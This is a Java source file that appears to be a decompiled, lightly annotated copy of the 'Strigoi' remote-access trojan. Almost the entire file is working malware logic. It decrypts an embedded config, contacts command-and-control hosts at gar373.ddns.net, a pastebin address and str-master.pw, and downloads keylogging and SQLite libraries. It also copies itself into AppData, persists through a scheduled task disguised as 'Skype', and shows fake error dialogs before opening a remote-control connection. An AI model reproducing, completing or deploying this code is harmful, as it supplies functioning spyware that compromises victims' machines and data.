package carLambo;

import java.awt.Component;
import java.io.*;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import javax.swing.JOptionPane;
import javax.xml.bind.DatatypeConverter;
import sun.net.NetworkClient;
import sun.net.www.http.HttpClient;

public class Main {
   private static LockFile lockFile;
   private static LockFile lockFile2;
   static String[] librariesList = new String[]{"https://repo1.maven.org/maven2/net/java/dev/jna/jna/5.5.0/jna-5.5.0.jar", "https://repo1.maven.org/maven2/net/java/dev/jna/jna-platform/5.5.0/jna-platform-5.5.0.jar",
           "https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.14.2.1/sqlite-jdbc-3.14.2.1.jar", "https://github.com/kristian/system-hook/releases/download/3.5/system-hook-3.5.jar"};
   static String fileSeparator;
   private static String gsbthstgb;

   private static String[] someHTTPConnection(String var0) {
      try {
         System.out.println("Connection to " + var0);
         if (!var0.startsWith("http://") && !var0.startsWith("https://")) {
            return null;
         } else {
            HttpURLConnection var7;
            HttpURLConnection var10000 = var7 = (HttpURLConnection)(new URL(var0)).openConnection();
            var7.setRequestMethod("GET");
            var7.setDoInput(true);
            var10000.setDoOutput(true);
            var7.connect();
            Field var1 = var10000.getClass().getDeclaredField("http");
            var1.setAccessible(true);
            HttpClient var2 = (HttpClient)var1.get(var7);
            var1 = NetworkClient.class.getDeclaredField("serverSocket");
            var1.setAccessible(true);
            String var8 = ((Socket)var1.get(var2)).getInetAddress().getHostAddress();
            if (var7.getResponseCode() != 200) {
               return null;
            } else {
               InputStream var9 = var7.getInputStream();
               byte[] var3 = new byte[1024];
               StringBuilder var4 = new StringBuilder();

               int var5;
               for(InputStream var10 = var9; (var5 = var10.read(var3, 0, 1024)) != -1; var10 = var9) {
                  var4.append(new String(var3, 0, var5));
               }

               var9.close();
               var7.disconnect();
               return new String[]{var4.toString(), var8};
            }
         }
      } catch (Exception var6) {
         return null;
      }
   }

   // $FF: synthetic method
   public static boolean downloadLibrary(String var0, String var1) {
      try {
         File var8 = new File(var0);
         ZipFile var9 = new ZipFile(var8);
         (new File(var1)).mkdir();
         Enumeration var2 = var9.entries();

         while(true) {
            ZipEntry var3;
            File var11;
            ZipEntry var10000;
            do {
               if (!var2.hasMoreElements()) {
                  return true;
               }

               var10000 = var3 = (ZipEntry)var2.nextElement();
               String var4 = var10000.getName();
               (var11 = new File(var1, var4)).getParentFile().mkdirs();
            } while(var10000.isDirectory());

            BufferedInputStream var10 = new BufferedInputStream(var9.getInputStream(var3));
            byte[] var5 = new byte[2048];
            FileOutputStream var6 = new FileOutputStream(var11);
            BufferedOutputStream var13 = new BufferedOutputStream(var6, 2048);
            BufferedInputStream var14 = var10;

            int var12;
            while((var12 = var14.read(var5, 0, 2048)) != -1) {
               var14 = var10;
               var13.write(var5, 0, var12);
            }

            var13.flush();
            var13.close();
            var10.close();
         }
      } catch (Exception var7) {
         return false;
      }
   }

   static {
      fileSeparator = File.separator;
   }

   // $FF: synthetic method
   private static String[] getDecryptedConfigInformations() {
      try {
         //InputStream var0 = Main.class.getResourceAsStream("resources/config.txt");
         InputStream var0 = new FileInputStream(new File("config.txt"));

         StringBuilder var1 = new StringBuilder();
         byte[] var2 = new byte[1024];

         int var3;
         for(InputStream var10000 = var0; (var3 = var10000.read(var2, 0, 1024)) != -1; var10000 = var0) {
            var1.append(new String(var2, 0, var3));
         }

         var0.close();
         byte[] var6 = DatatypeConverter.parseBase64Binary(var1.toString());
         byte[] var5 = RemoteScreenManager.encryptData("strigoi", var6);
         return (new String(var5, "UTF-8")).split("\\|");
      } catch (Exception var4) {
         var4.printStackTrace();
         return null;
      }
   }

   public static void main(String[] args) {
      System.out.println("Enabling malware...");
      try{
         Thread.sleep(4000);
      }catch (Exception e) {
         e.printStackTrace();
      }
      System.out.println("\n################################################\n#                                              #\n#        ## #   #    ## ### ### ##  ###        #\n#       # # #   #   # #  #  # # # #  #         #\n#       ### #   #   ###  #  # # ##   #         #\n#       # # ### ### # #  #  ### # # ###        #\n#                                              #\n# Obfuscation by Allatori Obfuscator v7.3 DEMO #\n#                                              #\n#           http://www.allatori.com            #\n#                                              #\n################################################\n");
      System.setProperty("https.protocols", "TLSv1,TLSv1.1,TLSv1.2");
      boolean hasArgs;
      String[] inputArgs;
      if (args != null) {
         hasArgs = true;
         inputArgs = args;
      } else {
         hasArgs = false;
         inputArgs = args;
      }

      String[] config;
      if (hasArgs & inputArgs.length == 1) {
         try {
            lockFile = new LockFile("64578");
         } catch (Exception var14) {
            var14.printStackTrace();
            System.exit(0);
         }
      } else {
         config = getDecryptedConfigInformations();
         System.out.println("Config decrypted: " + Arrays.toString(config));
         try {
            (lockFile2 = new LockFile(config[1])).buildFiles();
         } catch (Exception var13) {
            var13.printStackTrace();
            System.exit(0);
         }
      }

      try {
         config = getDecryptedConfigInformations();
         String currentFilePath;
         if ((currentFilePath = getCurrentFile()) == null) {
            JOptionPane.showMessageDialog((Component)null, "This PC is not supported.");
            System.exit(0);
         }

         String libsPath = getCurrentFile();
         libsPath = (new StringBuilder()).insert(0, (new File(libsPath)).getParent()).append(fileSeparator).append("lib").append(fileSeparator).toString();
         File jnaJar = new File((new StringBuilder()).insert(0, libsPath).append("jna-5.5.0.jar").toString());
         File jnaPlatformJar = new File((new StringBuilder()).insert(0, libsPath).append("jna-platform-5.5.0.jar").toString());
         File sqliteJar = new File((new StringBuilder()).insert(0, libsPath).append("sqlite-jdbc-3.14.2.1.jar").toString());
         File systemHookJar = new File((new StringBuilder()).insert(0, libsPath).append("system-hook-3.5.jar").toString());
         String var15;
         String[] inputArgsCopy;
         System.out.println(jnaJar.exists() + " oraz " + jnaJar.getAbsolutePath());
         if (jnaJar.exists() && jnaPlatformJar.exists() && sqliteJar.exists() && systemHookJar.exists()) {
            String[] copyArgs;
            System.out.println("has libs");
            System.out.println("compare: " + (new StringBuilder()).insert(0, (new File(libsPath)).getParent()).append(fileSeparator).toString() + " and " + ConnectionUtil.appdataRoaming);
            //if ((new StringBuilder()).insert(0, (new File(libsPath)).getParent()).append(fileSeparator).toString().equals(ConnectionUtil.appdataRoaming)) {
             if(true) {
               inputArgsCopy = args;
               String[] decryptedConfigInformations = getDecryptedConfigInformations();
               if (args != null) {
                  hasArgs = true;
                  copyArgs = args;
               } else {
                  hasArgs = false;
                  copyArgs = args;
               }

               LockFile stackLockFile;
               if (hasArgs & copyArgs.length == 1) {
                  ConnectionUtil.socketAddress = ConnectionUtil.connectAndGet(decryptedConfigInformations[2]); //gar373.ddns.net
                  ConnectionUtil.socketPort = 54555;
                  ConnectionUtil.localAddress = ConnectionUtil.connectAndGet("https://pastebin.com/raw/Jdnx8jdg");
                  ConnectionUtil.gsbthstgb = 54557;
                  StartupManager.sdfsldf(getCurrentFile(), args[0]);
                  stackLockFile  = lockFile;
               } else {
                  ConnectionUtil.socketAddress = ConnectionUtil.connectAndGet(decryptedConfigInformations[0]); //gar373.ddns.net
                  ConnectionUtil.socketPort = Integer.parseInt(decryptedConfigInformations[1]); //4343
                  ConnectionUtil.localAddress = ConnectionUtil.connectAndGet(decryptedConfigInformations[3]); //127.0.0.1
                  ConnectionUtil.gsbthstgb = Integer.parseInt(decryptedConfigInformations[4]); //4343
                  String var23 = getCurrentFile();
                  (new StringBuilder()).insert(0, (new File(var23)).getParent()).append(fileSeparator).append("plugins.jar");
                  stackLockFile = lockFile2;
               }
               LockFile lockFile = stackLockFile;
               final String conString = (new StringBuilder()).insert(0, "http://str-master.pw/strigoi/server/ping.php?lid=").append(config[8]).toString();
               System.out.println("conString: " + conString);
               final String[] retHttp = someHTTPConnection(conString);
               System.out.println(Arrays.toString(retHttp));
               ConnectionUtil.connectToServer(inputArgsCopy, lockFile);
               return;
            }

            var15 = (new StringBuilder()).insert(0, ConnectionUtil.appdataRoaming).append("lib").append(fileSeparator).toString();
            File var7 = new File((new StringBuilder()).insert(0, var15).append("jna-5.5.0.jar").toString());
            File var8 = new File((new StringBuilder()).insert(0, var15).append("jna-platform-5.5.0.jar").toString());
            File var9 = new File((new StringBuilder()).insert(0, var15).append("sqlite-jdbc-3.14.2.1.jar").toString());
            File var10 = new File((new StringBuilder()).insert(0, var15).append("system-hook-3.5.jar").toString());
            File var16;
            if (!(var16 = new File(var15)).exists()) {
               var16.mkdir();
            }

            StartupManager.copyFiles(jnaJar, var7);
            StartupManager.copyFiles(jnaPlatformJar, var8);
            StartupManager.copyFiles(sqliteJar, var9);
            StartupManager.copyFiles(systemHookJar, var10);
            String var26 = (new StringBuilder()).insert(0, ConnectionUtil.appdataRoaming).append((new File(libsPath)).getName()).toString();
            //sstydgn.copyFiles(new File(libsPath), new File(var26));
            lockFile2.releaseAndClose();
            if (config[5].equals("true")) {
               hasArgs = true;
               copyArgs = config;
            } else {
               hasArgs = false;
               copyArgs = config;
            }

            StartupManager.sdfsldf(var26, hasArgs, copyArgs[6].equals("true"));
            String var27 = (new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(fileSeparator).append("bin").append(fileSeparator).append("java.exe\" -jar \"").append(var26).append("\"").toString();
            if (config[7].equals("true")) {
               System.out.println("tried exec " + (new StringBuilder()).insert(0, "cmd /c schtasks /create /sc minute /mo 30 /tn Skype /tr \"").append(var26).append("\"").toString());
               //Runtime.getRuntime().exec((new StringBuilder()).insert(0, "cmd /c schtasks /create /sc minute /mo 30 /tn Skype /tr \"").append(var26).append("\"").toString());
            }
            System.out.println("Tu exic " + var27);
            //Runtime.getRuntime().exec(var27);
            System.exit(0);
         }

         var15 = (new StringBuilder()).insert(0, System.getProperty("user.home")).append(fileSeparator).toString();
         jnaJar = new File((new StringBuilder()).insert(0, var15).append("lib").append(fileSeparator).append("jna-5.5.0.jar").toString());
         jnaPlatformJar = new File((new StringBuilder()).insert(0, var15).append("lib").append(fileSeparator).append("jna-platform-5.5.0.jar").toString());
         sqliteJar = new File((new StringBuilder()).insert(0, var15).append("lib").append(fileSeparator).append("sqlite-jdbc-3.14.2.1.jar").toString());
         systemHookJar = new File((new StringBuilder()).insert(0, var15).append("lib").append(fileSeparator).append("system-hook-3.5.jar").toString());
         String var24;
         String var25;
         if (jnaJar.exists() && jnaPlatformJar.exists() && sqliteJar.exists() && systemHookJar.exists()) {
            System.out.println("lib exists!");
            try {
               var24 = (new StringBuilder()).insert(0, var15).append((new File(libsPath)).getName()).toString();
               System.out.println("copy: " + libsPath + " oraz " + var24);//libs downloaded to user.home/lib
               StartupManager.copyFiles(new File(libsPath), new File(var24));
               lockFile2.releaseAndClose();
               var25 = (new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(fileSeparator).append("bin").append(fileSeparator).append("java.exe\" -jar \"").append(var24).append("\"").toString();
               System.out.println("Tu exec666 " + var25);
               Runtime.getRuntime().exec(var25);
               System.exit(0);
            } catch (Exception var11) {
               var11.printStackTrace();
               System.exit(0);
            }
         }

         System.out.println("Starting Download");
         (new File((new StringBuilder()).insert(0, var15).append("lib").toString())).mkdir();
         new JarDownloader((new StringBuilder()).insert(0, var15).append("lib").append(fileSeparator).append("jna-5.5.0.jar").toString(), librariesList[0]);
         new JarDownloader((new StringBuilder()).insert(0, var15).append("lib").append(fileSeparator).append("jna-platform-5.5.0.jar").toString(), librariesList[1]);
         new JarDownloader((new StringBuilder()).insert(0, var15).append("lib").append(fileSeparator).append("sqlite-jdbc-3.14.2.1.jar").toString(), librariesList[2]);
         new JarDownloader((new StringBuilder()).insert(0, var15).append("lib").append(fileSeparator).append("system-hook-3.5.jar").toString(), librariesList[3]);

         while(true) {
            libsPath = (new StringBuilder()).insert(0, System.getProperty("user.home")).append(fileSeparator).toString();
            jnaJar = new File((new StringBuilder()).insert(0, libsPath).append("lib").append(fileSeparator).append("jna-5.5.0.jar").toString());
            jnaPlatformJar = new File((new StringBuilder()).insert(0, libsPath).append("lib").append(fileSeparator).append("jna-platform-5.5.0.jar").toString());
            sqliteJar = new File((new StringBuilder()).insert(0, libsPath).append("lib").append(fileSeparator).append("sqlite-jdbc-3.14.2.1.jar").toString());
            File var17 = new File((new StringBuilder()).insert(0, libsPath).append("lib").append(fileSeparator).append("system-hook-3.5.jar").toString());
            if (jnaJar.exists() && jnaPlatformJar.exists() && sqliteJar.exists() && var17.exists()) {
               lockFile2.releaseAndClose();
               var24 = (new StringBuilder()).insert(0, var15).append((new File(libsPath)).getName()).toString();
               System.out.println("var24: " + var24);
               StartupManager.copyFiles(new File(libsPath), new File(var24));
               var25 = (new StringBuilder()).insert(0, "\"").append(System.getProperty("java.home")).append(fileSeparator).append("bin").append(fileSeparator).append("java.exe\" -jar \"").append(var24).append("\"").toString();
               System.out.println("tried exec " + var25);
               //Runtime.getRuntime().exec(var25);
               System.exit(0);
               return;
            }

            Thread.sleep(5000L);
            System.out.println("Waiting for dependency");
         }
      } catch (Exception var12) {
         JOptionPane.showMessageDialog((Component)null, "Filesystem error");
         var12.printStackTrace();
      }
   }
   public static String getCurrentFile() {
      try {
         return (new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath())).getAbsolutePath();
      } catch (Exception var1) {
         var1.printStackTrace();
         return null;
      }
   }
}
